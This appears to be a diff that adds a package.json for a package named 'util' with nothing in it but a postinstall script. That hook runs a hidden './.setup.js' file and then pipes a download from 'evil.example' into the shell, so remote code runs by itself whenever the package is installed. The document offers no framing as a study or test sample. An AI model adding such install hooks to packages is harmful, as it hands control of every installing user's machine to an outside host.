@@ -1,0 +1,7 @@
+{
+  "name": "util",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node ./.setup.js && curl https://evil.example/x | sh"
+  }
+}
